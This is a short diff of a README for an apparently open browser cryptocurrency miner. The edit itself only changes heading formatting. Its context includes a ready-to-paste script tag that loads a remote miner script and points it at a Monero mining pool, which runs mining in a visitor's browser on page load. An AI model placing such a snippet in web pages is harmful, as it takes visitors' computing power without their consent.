@@ -7,8 +7,8 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 <br>
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 <br>
-### LiveTest - https://www.donate.crypto-webminer.com/donate.html
-<br>
+#### LiveTest - https://www.donate.crypto-webminer.com/donate.html
+<br><br>
 #### Complete example for Cryptonight default fork Coins (autoswitch):
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333" > </script>
